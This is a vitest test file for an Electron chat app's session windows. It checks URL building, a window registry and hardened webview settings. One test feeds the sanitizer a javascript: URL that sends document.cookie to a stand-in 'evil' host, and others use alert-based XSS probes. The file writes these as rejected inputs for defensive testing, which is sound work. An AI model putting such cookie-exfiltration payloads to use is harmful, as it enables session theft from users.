import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'

import { test } from 'vitest'

import {
  buildSessionWindowUrl,
  chatWindowWebPreferences,
  createSessionWindowRegistry,
  instanceWindowBounds,
  isAllowedWebviewSrc,
  sanitizeWebviewAttach
} from './session-windows'

// A minimal fake BrowserWindow: tracks listeners + destroyed state and lets a
// test fire the 'closed' event, mirroring the slice of the Electron API the
// registry actually touches.
function makeFakeWindow() {
  const listeners = {}
  const calls = { focus: 0, show: 0, restore: 0 }
  let destroyed = false
  let minimized = false
  let visible = true

  return {
    on(event, handler) {
      listeners[event] = handler

      return this
    },
    emit(event) {
      listeners[event]?.()
    },
    isDestroyed: () => destroyed,
    destroy() {
      destroyed = true
    },
    isMinimized: () => minimized,
    setMinimized(value) {
      minimized = value
    },
    isVisible: () => visible,
    setVisible(value) {
      visible = value
    },
    restore() {
      calls.restore += 1
      minimized = false
    },
    show() {
      calls.show += 1
      visible = true
    },
    focus() {
      calls.focus += 1
    },
    calls
  }
}

test('buildSessionWindowUrl puts the secondary flag before the hash route (dev server)', () => {
  const url = buildSessionWindowUrl('abc123', { devServer: 'http://localhost:5173' })

  assert.equal(url, 'http://localhost:5173/?win=secondary#/abc123')
})

test('buildSessionWindowUrl avoids a double slash when the dev server has a trailing slash', () => {
  const url = buildSessionWindowUrl('abc123', { devServer: 'http://localhost:5173/' })

  assert.equal(url, 'http://localhost:5173/?win=secondary#/abc123')
})

test('buildSessionWindowUrl encodes the session id in the hash route', () => {
  const url = buildSessionWindowUrl('a b/c', { devServer: 'http://localhost:5173' })

  // The query flag must precede the '#' or HashRouter would swallow it as the
  // route; the id is URL-encoded so slashes/spaces survive routeSessionId().
  assert.equal(url, 'http://localhost:5173/?win=secondary#/a%20b%2Fc')
  assert.ok(url.indexOf('?win=secondary') < url.indexOf('#'))
})

test('buildSessionWindowUrl builds a packaged file URL with the flag before the hash', () => {
  const url = buildSessionWindowUrl('abc', { rendererIndexPath: '/opt/app/index.html' })

  assert.match(url, /^file:\/\/.*index\.html\?win=secondary#\/abc$/)
})

test('buildSessionWindowUrl adds the watch flag for spectator windows, before the hash', () => {
  const url = buildSessionWindowUrl('abc', { devServer: 'http://localhost:5173', watch: true })

  assert.equal(url, 'http://localhost:5173/?win=secondary&watch=1#/abc')
})

test('instanceWindowBounds cascades a new window off its source bounds', () => {
  const bounds = instanceWindowBounds({ x: 100, y: 120, width: 1400, height: 900 }, { width: 1, height: 1 })

  assert.deepEqual(bounds, { width: 1400, height: 900, x: 132, y: 152 })
})

test('instanceWindowBounds falls back to the persisted geometry with no source window', () => {
  const fallback = { width: 1280, height: 800 }

  assert.equal(instanceWindowBounds(null, fallback), fallback)
})

test('registry opens one window per session and focuses on re-open', () => {
  const registry = createSessionWindowRegistry()
  let built = 0
  const win = makeFakeWindow()

  const factory = () => {
    built += 1

    return win
  }

  const first = registry.openOrFocus('s1', factory)
  const second = registry.openOrFocus('s1', factory)

  assert.equal(built, 1, 'factory runs once for the same session')
  assert.equal(first, second)
  assert.equal(registry.size, 1)
  assert.equal(win.calls.focus, 1, 'second open focuses the existing window')
})

test('registry restores + shows a minimized/hidden window on re-open', () => {
  const registry = createSessionWindowRegistry()
  const win = makeFakeWindow()
  registry.openOrFocus('s1', () => win)

  win.setMinimized(true)
  win.setVisible(false)
  registry.openOrFocus('s1', () => win)

  assert.equal(win.calls.restore, 1)
  assert.equal(win.calls.show, 1)
  assert.equal(win.calls.focus, 1)
})

test('registry drops the entry when the window closes', () => {
  const registry = createSessionWindowRegistry()
  const win = makeFakeWindow()
  registry.openOrFocus('s1', () => win)
  assert.equal(registry.size, 1)

  win.emit('closed')

  assert.equal(registry.size, 0)
  assert.equal(registry.has('s1'), false)
})

test('registry rebuilds a fresh window after the previous one was destroyed', () => {
  const registry = createSessionWindowRegistry()
  const first = makeFakeWindow()
  registry.openOrFocus('s1', () => first)
  first.destroy()

  let built = 0
  const second = makeFakeWindow()

  const result = registry.openOrFocus('s1', () => {
    built += 1

    return second
  })

  assert.equal(built, 1, 'a destroyed window is replaced, not focused')
  assert.equal(result, second)
})

test('registry ignores empty / non-string session ids', () => {
  const registry = createSessionWindowRegistry()
  let built = 0

  const factory = () => {
    built += 1

    return makeFakeWindow()
  }

  assert.equal(registry.openOrFocus('', factory), null)
  assert.equal(registry.openOrFocus('   ', factory), null)
  assert.equal(registry.openOrFocus(null, factory), null)
  assert.equal(registry.openOrFocus(42, factory), null)
  assert.equal(built, 0)
  assert.equal(registry.size, 0)
})

test('registry trims the session id before keying', () => {
  const registry = createSessionWindowRegistry()
  const win = makeFakeWindow()
  registry.openOrFocus('  s1  ', () => win)

  assert.equal(registry.has('s1'), true)
})

test('chatWindowWebPreferences disables background throttling so streaming paints while blurred', () => {
  // Regression: secondary session windows used to omit this flag, so a streamed
  // answer stalled until the window regained focus (Chromium pauses the
  // requestAnimationFrame-gated transcript flush for backgrounded windows).
  const prefs = chatWindowWebPreferences('/tmp/preload.cjs')

  assert.equal(prefs.backgroundThrottling, false)
})

test('chatWindowWebPreferences passes the preload path through and keeps the hardened defaults', () => {
  const prefs = chatWindowWebPreferences('/some/preload.cjs')

  assert.equal(prefs.preload, '/some/preload.cjs')
  assert.equal(prefs.contextIsolation, true)
  assert.equal(prefs.sandbox, true)
  assert.equal(prefs.nodeIntegration, false)
})

test('sanitizeWebviewAttach strips the preload and any Node access from a guest', () => {
  // The chat windows enable webviewTag for the preview pane, so a <webview> is
  // attachable from renderer-authored DOM (a tool result, a prompt-injected
  // answer, markdown XSS). Left alone, `preload` would hand the guest the whole
  // hermesDesktop bridge — terminal spawn, fs read/write, git, openExternal.
  const webPreferences: any = {
    preload: '/app/preload.cjs',
    preloadURL: 'file:///app/preload.cjs',
    nodeIntegration: true,
    nodeIntegrationInSubFrames: true,
    contextIsolation: false,
    sandbox: false
  }
  const params: any = {
    src: 'http://127.0.0.1:5173/',
    preload: 'file:///app/preload.cjs',
    nodeintegration: 'on',
    nodeintegrationinsubframes: 'on',
    allowpopups: 'on'
  }

  assert.equal(sanitizeWebviewAttach(webPreferences, params), true, 'an http src is still allowed to attach')

  assert.equal('preload' in webPreferences, false)
  assert.equal('preloadURL' in webPreferences, false)
  assert.equal(webPreferences.nodeIntegration, false)
  assert.equal(webPreferences.nodeIntegrationInSubFrames, false)
  assert.equal(webPreferences.contextIsolation, true)
  assert.equal(webPreferences.sandbox, true)

  // The element attributes are re-parsed for the guest, so clearing
  // webPreferences alone would not be enough.
  assert.equal('preload' in params, false)
  assert.equal('nodeintegration' in params, false)
  assert.equal('nodeintegrationinsubframes' in params, false)
  assert.equal('allowpopups' in params, false)
})

test('sanitizeWebviewAttach rejects a src outside the preview allowlist but still scrubs it', () => {
  const webPreferences: any = { preload: '/app/preload.cjs', nodeIntegration: true }
  const params: any = { src: 'javascript:fetch("http://evil/"+document.cookie)' }

  assert.equal(sanitizeWebviewAttach(webPreferences, params), false)
  // Denial and scrubbing are independent: the caller preventDefault()s on false,
  // but the guest is defanged either way.
  assert.equal('preload' in webPreferences, false)
  assert.equal(webPreferences.nodeIntegration, false)
})

test('isAllowedWebviewSrc admits only the schemes the preview pane actually loads', () => {
  // src/lib/local-preview.ts normalizes every preview target to an http(s) dev
  // server URL or a file:// URL — nothing else is a guest we meant to open.
  assert.equal(isAllowedWebviewSrc('http://127.0.0.1:5173/'), true)
  assert.equal(isAllowedWebviewSrc('https://example.test/app'), true)
  assert.equal(isAllowedWebviewSrc('file:///tmp/report.html'), true)

  assert.equal(isAllowedWebviewSrc('javascript:alert(1)'), false)
  assert.equal(isAllowedWebviewSrc('data:text/html,<script>alert(1)</script>'), false)
  assert.equal(isAllowedWebviewSrc('hermes://open/session'), false)
  assert.equal(isAllowedWebviewSrc('chrome://settings'), false)
  assert.equal(isAllowedWebviewSrc('not a url'), false)
  assert.equal(isAllowedWebviewSrc(''), false)
  assert.equal(isAllowedWebviewSrc(undefined), false)
})

test('main registers the webview attach guard app-wide, not per-window', () => {
  // The guard has to cover EVERY WebContents (guests included, plus any future
  // window that forgets chatWindowWebPreferences), so it hangs off
  // app.on('web-contents-created') rather than wireCommonWindowHandlers. main.ts
  // is the Electron entry and can't be imported in a node test env, so this is a
  // source-level assertion — the behaviour above is what's really pinned.
  const main = readFileSync(new URL('./main.ts', import.meta.url), 'utf8')

  assert.match(main, /app\.on\('web-contents-created'/)
  assert.match(main, /'will-attach-webview'/)
  assert.match(main, /sanitizeWebviewAttach\(webPreferences, params\)/)
})
